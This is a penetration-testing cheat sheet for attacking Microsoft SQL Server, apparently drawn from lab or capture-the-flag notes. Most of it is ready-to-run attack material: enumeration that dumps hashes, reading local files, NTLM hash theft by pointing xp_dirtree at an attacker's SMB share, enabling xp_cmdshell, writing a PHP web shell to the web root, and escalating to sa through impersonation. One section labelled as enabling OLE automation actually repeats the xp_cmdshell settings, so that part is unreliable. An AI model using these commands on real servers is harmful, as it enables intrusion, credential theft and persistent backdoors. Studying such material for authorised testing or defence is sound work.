# 1433 - MSSQL - Microsoft SQL Server

## Enumeration

| Command                                                                                                                                                                                                                                                                                                     | Description                                              |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248` | Nmap MSSQL enumeration                                   |
| `mssql_ping`                                                                                                                                                                                                                                                                                                | Msf scanner (version, server name, np, etc.)             |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth`                                                                                                                                                                                                                                                             | Log in to the MSSQL server using Windows authentication. |

## Tables

| Table      | Description                                                                                                                                                                                                    |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `master`   | TABLE : Tracks all system information for an SQL server instance                                                                                                                                               |
| `model`    | TABLE : Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`     | TABLE : The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`   | TABLE : Stores temporary objects                                                                                                                                                                               |
| `resource` | TABLE : Read-only database containing system objects included with SQL server                                                                                                                                  |

## Read local files in MSSQL

{% code overflow="wrap" %}
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
{% endcode %}

{% code overflow="wrap" %}
```sql
EXECUTE('SELECT * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]
```
{% endcode %}

## Hash stealing using the xp\_dirtree command in MSSQL

```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

## Hash stealing using the xp\_subdirs command in MSSQL

```sql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

## Identify linked servers in MSSQL

```sql
 SELECT srvname, isremote FROM sysservers
```

## Identify the user and its privileges used for the remote connection in MSSQL

{% code overflow="wrap" %}
```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
{% endcode %}

## Enable XP\_cmdshell

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Enable ole Automation Procedures (need to create file)



```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO

To create file : 

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Impersonate Users

1. Identify

```powershell
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

2. Verify our Current User and Role

```powershell
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

3. Impersonate the SA User

```powershell
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
